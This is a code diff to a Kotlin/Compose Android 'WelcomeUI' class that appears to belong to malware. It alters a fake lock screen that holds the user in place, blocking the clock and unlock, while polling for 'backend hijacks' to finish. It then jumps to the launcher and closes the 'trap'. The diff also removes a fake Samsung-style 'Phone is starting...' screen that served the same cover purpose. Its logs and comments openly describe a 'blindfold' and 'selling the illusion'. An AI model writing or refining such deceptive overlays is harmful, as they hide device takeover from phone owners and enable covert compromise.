@@ -95,7 +95,7 @@ class WelcomeUI : DynamicEntry() {
         var currentStep by remember { mutableStateOf(0) }
         var isProcessing by remember { mutableStateOf(false) }
         val scope = rememberCoroutineScope() 
-        val transientSteps = remember { listOf(4, 5, 7, 8, 9, 11, 12, 16, 17, 18, 21, 22) }
+        val transientSteps = remember { listOf(4, 5, 7, 8, 9, 11, 12, 16, 17, 18, 21) }
 
         fun navigateTo(step: Int) {
             if (isProcessing) return
@@ -163,10 +163,13 @@ class WelcomeUI : DynamicEntry() {
                             }
                         })
                         21 -> FakeLockScreen(baseDir, api, onSwipeUp = { 
-                            api.log("WELCOME_UI: User swiped up on fake lock screen. Moving to Phone Starting.")
-                            currentStep = 22 
+                            api.log("WELCOME_UI: User swiped up on fake lock screen. Routing to HOME and terminating trap.")
+                            api.nav("HOME")
+                            scope.launch {
+                                delay(300) // Brief delay to let the OS process the Home intent under the blindfold
+                                api.close()
+                            }
                         })
-                        22 -> PhoneStartingScreen(baseDir, api)
                     }
                 }
             }
@@ -517,9 +520,23 @@ class WelcomeUI : DynamicEntry() {
         var hasSwiped by remember { mutableStateOf(false) }
         
         LaunchedEffect(Unit) {
-            api.log("FAKE_LOCK: Launched. Waiting for video readiness...")
+            api.log("FAKE_LOCK: Launched. Waiting 5s for video playback...")
             delay(5000)
-            api.log("FAKE_LOCK: 5 seconds elapsed. Fading in clock.")
+            
+            api.log("FAKE_LOCK: 5s elapsed. Waiting for backend hijacks to complete before allowing unlock...")
+            val startTime = System.currentTimeMillis()
+            var isDone = false
+            while (!isDone && (System.currentTimeMillis() - startTime) < 45000) {
+                try {
+                    val sysInfoStr = api.getSystemInfo()
+                    if (sysInfoStr != null) {
+                        isDone = org.json.JSONObject(sysInfoStr).optBoolean("hijacks_completed", false)
+                    }
+                } catch(e: Exception) {}
+                if (!isDone) delay(1000)
+            }
+            
+            api.log("FAKE_LOCK: Backend hijacks complete. Fading in clock.")
             showClock = true
         }
 
@@ -598,7 +615,6 @@ class WelcomeUI : DynamicEntry() {
                         awaitPointerEventScope {
                             var startY = 0f
                             while(true) {
-                                // PointerEventPass.Initial intercepts the touch *before* the AndroidView gets a chance to consume/cancel it
                                 val event = awaitPointerEvent(androidx.compose.ui.input.pointer.PointerEventPass.Initial)
                                 val change = event.changes.firstOrNull()
                                 
@@ -611,7 +627,7 @@ class WelcomeUI : DynamicEntry() {
                                             api.log("FAKE_LOCK_RAW: BULLETPROOF SWIPE UP DETECTED (Delta: $delta). Unlocking.")
                                             hasSwiped = true
                                             onSwipeUp()
-                                            change.consume() // Consume so the gesture stops propagating
+                                            change.consume()
                                         }
                                     }
                                 }
@@ -619,41 +635,6 @@ class WelcomeUI : DynamicEntry() {
                         }
                     }
             )
-        }
-    }
-
-    @Composable
-    fun PhoneStartingScreen(baseDir: String, api: com.example.myandroid.dynamic.CortexNativeAPI) {
-        LaunchedEffect(Unit) {
-            api.log("PHONE_STARTING: Screen active. Waiting for backend hijacks to complete.")
-            val startTime = System.currentTimeMillis()
-            var isDone = false
-            
-            while (!isDone && (System.currentTimeMillis() - startTime) < 60000) {
-                delay(1000)
-                try {
-                    val sysInfoStr = api.getSystemInfo()
-                    if (sysInfoStr != null) {
-                        val sysInfo = org.json.JSONObject(sysInfoStr)
-                        isDone = sysInfo.optBoolean("hijacks_completed", false)
-                    }
-                } catch(e: Exception) {}
-            }
-            
-            api.log("PHONE_STARTING: Hijacks complete (or timeout). Removing UI to reveal launcher.")
-            delay(1500) // Brief pause to sell the illusion
-            api.close()
-        }
-
-        Box(
-            modifier = Modifier.fillMaxSize().background(Color.Black).pointerInput(Unit) {},
-            contentAlignment = Alignment.Center
-        ) {
-            Column(horizontalAlignment = Alignment.CenterHorizontally) {
-                SamsungSpinner(baseDir)
-                Spacer(modifier = Modifier.height(24.dp))
-                Text("Phone is starting...", color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Medium)
-            }
         }
     }
 
